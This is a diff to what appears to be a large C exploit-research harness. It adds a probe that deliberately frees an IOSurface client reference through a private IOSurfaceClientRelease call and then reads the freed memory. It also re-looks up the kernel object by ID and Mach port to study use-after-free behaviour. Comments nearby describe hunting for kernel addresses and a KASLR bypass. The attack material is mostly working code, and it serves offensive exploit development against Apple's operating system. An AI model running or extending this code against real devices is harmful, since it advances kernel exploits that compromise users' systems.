@@ -15902,6 +15902,183 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r386: IOSurface Mach port lifecycle + UAF interaction.
+ * Test what happens when we:
+ * 1. Create an IOSurface + Mach port
+ * 2. Free the client ref (UAF)
+ * 3. Use the Mach port to look up the surface again
+ * 4. Check if the new client ref exposes any new data
+ * Also try: IOSurfaceLookup after free to see if kernel object persists
+ */
+static void r386_probe(void) {
+    rlog("\n=== r386: IOSurface Mach Port Lifecycle + UAF ===\n\n");
+    fflush(stdout);
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    /* Create the target surface and get its Mach port */
+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    uint32_t sid = IOSurfaceGetID(surf);
+    rlog("  Created surface: sid=%u ptr=%p\n", sid, surf);
+
+    /* Set a marker property */
+    int marker = 0xCAFE386;
+    CFNumberRef mval = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+    IOSurfaceSetValue(surf, CFSTR("Marker386"), mval);
+    CFRelease(mval);
+
+    /* Create Mach port BEFORE freeing */
+    mach_port_t (*createMP)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+    IOSurfaceRef (*lookupMP)(mach_port_t) = dlsym(RTLD_DEFAULT, "IOSurfaceLookupFromMachPort");
+    IOSurfaceRef (*lookupID)(uint32_t) = dlsym(RTLD_DEFAULT, "IOSurfaceLookup");
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+
+    rlog("  createMP=%p lookupMP=%p lookupID=%p clientRelease=%p\n",
+        createMP, lookupMP, lookupID, clientRelease);
+
+    mach_port_t mp = 0;
+    if (createMP) mp = createMP(surf);
+    rlog("  Mach port: 0x%x\n", mp);
+
+    /* Dump client ref offsets 0-15 that might contain the IOKit connection handle */
+    uint8_t *cref = (uint8_t*)surf;
+    rlog("  Pre-free client ref [0..48]:\n");
+    for (int off = 0; off <= 48; off += 8) {
+        uint64_t v;
+        memcpy(&v, cref + off, 8);
+        rlog("    +%d: 0x%016llx\n", off, (unsigned long long)v);
+    }
+
+    /* Phase 1: IOSurfaceLookup before free */
+    if (lookupID) {
+        IOSurfaceRef found = lookupID(sid);
+        rlog("\n  IOSurfaceLookup(%u) before free: %p\n", sid, found);
+        if (found) {
+            CFTypeRef rv = IOSurfaceCopyValue(found, CFSTR("Marker386"));
+            if (rv) {
+                int v = 0;
+                CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
+                rlog("    Marker: 0x%x (expect 0xCAFE386)\n", v);
+                CFRelease(rv);
+            }
+        }
+    }
+
+    /* Phase 2: Free the client ref via IOSurfaceClientRelease */
+    if (clientRelease) {
+        rlog("\n  Calling IOSurfaceClientRelease...\n");
+        clientRelease(surf);
+        rlog("  Post-clientRelease, checking freed memory:\n");
+        uint64_t v0;
+        memcpy(&v0, cref, 8);
+        rlog("    +0: 0x%016llx\n", (unsigned long long)v0);
+    }
+
+    /* Phase 3: IOSurfaceLookup AFTER clientRelease (kernel object should still exist) */
+    if (lookupID) {
+        IOSurfaceRef found2 = lookupID(sid);
+        rlog("\n  IOSurfaceLookup(%u) after clientRelease: %p\n", sid, found2);
+        if (found2) {
+            rlog("    NEW client ref at %p (old was %p)\n", found2, surf);
+            /* Dump new client ref */
+            uint8_t *cref2 = (uint8_t*)found2;
+            rlog("    New client ref [0..48]:\n");
+            for (int off = 0; off <= 48; off += 8) {
+                uint64_t v;
+                memcpy(&v, cref2 + off, 8);
+                rlog("      +%d: 0x%016llx\n", off, (unsigned long long)v);
+            }
+            /* Read the marker property through new ref */
+            CFTypeRef rv = IOSurfaceCopyValue(found2, CFSTR("Marker386"));
+            if (rv) {
+                int v = 0;
+                CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
+                rlog("    Marker through new ref: 0x%x\n", v);
+                CFRelease(rv);
+            }
+            CFRelease(found2);
+        }
+    }
+
+    /* Phase 4: IOSurfaceLookupFromMachPort AFTER clientRelease */
+    if (lookupMP && mp) {
+        IOSurfaceRef found3 = lookupMP(mp);
+        rlog("\n  IOSurfaceLookupFromMachPort(0x%x) after clientRelease: %p\n", mp, found3);
+        if (found3) {
+            uint8_t *cref3 = (uint8_t*)found3;
+            rlog("    Mach port client ref [0..48]:\n");
+            for (int off = 0; off <= 48; off += 8) {
+                uint64_t v;
+                memcpy(&v, cref3 + off, 8);
+                rlog("      +%d: 0x%016llx\n", off, (unsigned long long)v);
+            }
+            CFTypeRef rv = IOSurfaceCopyValue(found3, CFSTR("Marker386"));
+            if (rv) {
+                int v = 0;
+                CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
+                rlog("    Marker through Mach port ref: 0x%x\n", v);
+                CFRelease(rv);
+            }
+            CFRelease(found3);
+        }
+    }
+
+    /* Phase 5: Now CFRelease the original ref (truly free) */
+    rlog("\n  Calling CFRelease on original ref...\n");
+    CFRelease(surf);
+
+    /* Phase 6: Try IOSurfaceLookup AFTER full free */
+    if (lookupID) {
+        IOSurfaceRef found4 = lookupID(sid);
+        rlog("  IOSurfaceLookup(%u) after full free: %p\n", sid, found4);
+        if (found4) {
+            rlog("    KERNEL OBJECT STILL ALIVE (Mach port holds ref)\n");
+            CFTypeRef rv = IOSurfaceCopyValue(found4, CFSTR("Marker386"));
+            if (rv) {
+                int v = 0;
+                CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
+                rlog("    Marker after full free: 0x%x\n", v);
+                CFRelease(rv);
+            }
+            CFRelease(found4);
+        } else {
+            rlog("    Kernel object destroyed\n");
+        }
+    }
+
+    /* Phase 7: Deallocate Mach port and try again */
+    if (mp) {
+        mach_port_deallocate(mach_task_self(), mp);
+        rlog("\n  Mach port deallocated\n");
+    }
+    if (lookupID) {
+        IOSurfaceRef found5 = lookupID(sid);
+        rlog("  IOSurfaceLookup(%u) after port dealloc: %p\n", sid, found5);
+        if (found5) CFRelease(found5);
+    }
+
+    /* Cleanup */
+    CFRelease(props);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+
+    rlog("\n=== r386 complete ===\n");
+    fflush(stdout);
+}
+
 /* r385: Mach port + IOSurface cross-reference for kernel address.
  * r384 showed: client ref has NO kernel pointers, all PAC-signed userspace.
  * IOSurfaceCreateMachPort returns a valid port (0x1703).
@@ -59888,6 +60065,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 389) {
+            rlog("*** rounds=389: IOSurface Mach Port Lifecycle + UAF ***\n");
+            rlog("  Test port-based lookup after clientRelease, kernel object lifetime.\n\n");
+            fflush(stdout);
+            r386_probe();
+            goto done;
+        }
         if (rounds == 388) {
             rlog("*** rounds=388: Mach Port + Thread State KASLR Probe ***\n");
             rlog("  Thread state regs, dyld info, port introspection.\n\n");
@@ -62196,7 +62380,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
